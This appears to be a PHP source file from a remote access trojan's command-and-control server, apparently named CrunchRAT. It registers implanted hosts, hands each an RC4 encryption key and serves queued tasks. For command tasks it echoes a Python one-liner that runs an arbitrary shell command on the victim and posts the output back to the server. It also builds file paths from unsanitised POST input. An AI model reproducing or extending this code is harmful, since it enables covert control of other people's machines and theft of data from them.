<?php
    include "connector.php";
    
    # TO DO: Add in checks for POST data, reject all requests that don't have the proper POST parameters

    # JSON decodes implant POST data
    $post_data = json_decode(file_get_contents("php://input"), true);
    $hostname = $post_data["hostname"];
    $process_id = $post_data["process_id"];
    $os = $post_data["os"];
    $current_user = $post_data["current_user"];

    # Gets current time in UTC (will be used for updating "Last Seen")
    $current_time = gmdate("Y-m-d H:i:s");

    # Creates beacon log file path (based on POST hostname and process ID)
    $beacon_log_file = "/var/log/CrunchRAT/" . $hostname . "/" . $process_id . ".log";

    # If directory does not exist
    # Creates new directory
    if(!file_exists(dirname($beacon_log_file))) {
        mkdir(dirname($beacon_log_file), 0777, true);
        touch($beacon_log_file);
    }
    # Else directory already exists
    # Creates a new beacon log file
    else {
        touch($beacon_log_file);
    }

    # SQL statement to determine if this is a new or old beaconing host
    $statement = $database_connection->prepare("SELECT * FROM `implants` WHERE `hostname` = :hostname AND `process_id` = :process_id");
    $statement->bindValue(":hostname", $hostname);
    $statement->bindValue(":process_id", $process_id);
    $statement->execute();
    $row_count = $statement->rowCount();

    # If new host
    if ($row_count == "0") {
        # Generates unique encryption key for the new implant
        $encryption_key = uniqid();

        # Inserts entry into "implants" table
        $statement = $database_connection->prepare("INSERT INTO `implants` (`hostname`, `process_id`, `os`, `current_user`, `last_seen`, `encryption_key`) VALUES (:hostname, :process_id, :os, :current_user, :last_seen, :encryption_key)");
        $statement->bindValue(":hostname", $hostname);
        $statement->bindValue(":process_id", $process_id);
        $statement->bindValue(":os", $os);
        $statement->bindValue(":current_user", $current_user);
        $statement->bindValue(":last_seen", $current_time);
        $statement->bindValue(":encryption_key", $encryption_key);
        $statement->execute();

        # Echoes out encryption key and routine in the HTTP response
        # This is the only time this encryption key is exchanged


        # TO DO: This will echo out the encryption key, but I need to also echo out the encryption and decryption functions
        # Each line in the encrypt() and decrypt() functions needs two whitespaces or else it errors
        # TO DO: Removing debugging code and add in echo of Python RC4 encryption and decryption routines here
        echo "def encrypt(data):\n  key = '" . $encryption_key . "'\n  S = range(256)\n  j = 0\n  out = []\n  for i in range(256):\n    j = (j + S[i] + ord(key[i % len(key)])) % 256\n    S[i] , S[j] = S[j] , S[i]\n  i = j = 0\n  for char in data:\n    i = ( i + 1 ) % 256\n    j = ( j + S[i] ) % 256\n    S[i] , S[j] = S[j] , S[i]\n    out.append(chr(ord(char) ^ S[(S[i] + S[j]) % 256]))\n  return ''.join(out)";

        #echo "def decrypt():\n  k = '" . $encryption_key . "'" . "\n  print 'this is the decryption routine'\n  print k\n";


    }
    # Else old host
    else {
        # Updates "Last Seen" for the host
        $statement = $database_connection->prepare("UPDATE `implants` SET `last_seen` = :last_seen WHERE `hostname` = :hostname AND `process_id` = :process_id");
        $statement->bindValue(":last_seen", $current_time);
        $statement->bindValue(":hostname", $hostname);
        $statement->bindValue(":process_id", $process_id);
        $statement->execute();

        # Checks for tasking
        $statement = $database_connection->prepare("SELECT * FROM `tasks` WHERE `hostname` = :hostname AND `process_id` = :process_id");
        $statement->bindValue(":hostname", $hostname);
        $statement->bindValue(":process_id", $process_id);
        $statement->execute();
        $results = $statement->fetch();
        $row_count = $statement->rowCount();

        # TO DO: This is just to show that the encryption key and routine are now stored in memory on the implanted system
        # "\n" is necessary to terminate the line
        echo "encrypt('This is a test.')\n";
        #echo "decrypt()\n";

        # If tasking found
        if ($row_count > "0") {
            # Gets task UID, task action, and task secondary
            # This will be used to generate the Python one-liner code
            $task_uid = $results["unique_id"];
            $task_action = $results["task_action"];
            $task_secondary = $results["task_secondary"];

            if ($task_action == "command") {
                # TO DO: Echo appropriate Python one-liner code to do command task here
                echo "import urllib2, json; from subprocess import Popen, PIPE; command = '" . $task_secondary . "'; p = Popen(command, stdout=PIPE, stderr=PIPE, shell=True); out, err = p.communicate(); post_data = {\"hostname\": hostname, \"current_user\": current_user, \"process_id\": process_id, \"os\": operating_system, \"output\": out, \"error\": err}; request = urllib2.Request(update_url); request.add_header(\"Content-Type\", \"application/json\"); request.add_header(\"User-Agent\", user_agent); f = urllib2.urlopen(request, json.dumps(post_data))";
                #echo "print update_uri";

                # TO DO: Also include urllib2 code to update command output (we will get the update URI above and include it in the command echo)

                # TO DO: Also wrap everything in a nice try/catch so we don't crash on error
            }
        }
    }

    # Kills database connection
    $statement->connection = null;
?>